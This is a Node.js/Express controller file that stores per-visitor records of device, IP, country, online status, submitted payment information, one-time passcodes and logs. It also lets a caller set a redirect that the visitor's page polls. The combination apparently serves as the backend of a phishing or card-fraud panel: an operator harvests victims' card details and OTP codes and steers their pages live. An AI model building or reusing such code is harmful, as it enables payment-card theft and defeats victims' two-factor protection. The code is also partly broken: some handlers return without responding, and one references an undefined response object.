const User = require("../model/user");


exports.addUser = async (req, res) => {

    const { device, last_connected, id, page_id, status, Country, ip } = req.body;
    try {
        const user = await User.create({
            id: id,
            device: device,
            last_connected: last_connected,
            quick_data: { payment_info: [] },
            page_id: page_id,
            status: status,
            Country: Country,
            ip: ip,
            otp: [],
            logs: [],
            redirect: null,
            homeinfo: false,
            otpinfo: false



        });
        return res.send({ success: true });

    } catch (err) {

        return res.status(500).json({ message: err.message });
    }

};
exports.updateUser = async (req, res) => {

    const { id, quickdata, otp, logs, status, homeinfo } = req.body;
    console.log(status);

    try {
        if (quickdata) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            user.quick_data.payment_info.addToSet(quickdata);


            // Save the updated user document
            await user.save();



        }

        if (logs) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array

            user.logs.addToSet(logs);
            console.log(user);

            // Save the updated user document
            await user.save();


        }
        if (otp) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array

            user.otp.addToSet(otp);
            user.otpinfo = true;


            // Save the updated user document
            await user.save();



        }
        if (status) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array

            user.status = status


            // Save the updated user document
            await user.save();



        }
        if (homeinfo) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array

            user.homeinfo = true;


            // Save the updated user document
            await user.save();



        }

        const user = await User.findOne({ id: id });

        return res.send(user);
    } catch (err) {
        return res.status(500).json({ message: err.message });
    }

}
exports.updateStatus = async (id, status) => {
    try {
        const user = await User.findOne({ id: id });
        user.status = 'Off-Line';
        await user.save();
    }

    catch (err) {
        return res.status(500).json({ message: err.message });
    }


}
exports.checkRedirect = async (req, res) => {
    const { id } = req.body;
    try {
        if (id) {
            const user = await User.findOne({ id: id });
            return res.send({ redirect: user.redirect, status: user.status });
        }
    } catch (err) {
        return res.status(500).json({ message: err.message });
    }





}
exports.updateRedirect = async (req, res) => {
    try {
        const { id, redirect } = req.body;
        const user = await User.findOne({ id: id });
        user.redirect = redirect


        // Save the updated user document
        await user.save();
        return res.send("success");
    } catch (err) {
        return res.status(500).json({ message: err.message });
    }



}
exports.getuser = async (req, res) => {
    const { id } = req.body;
    try {
        const user = await User.findOne({ id: id });
        res.send(user);
    } catch (err) {
        return res.status(500).json({ message: err.message });
    }


}
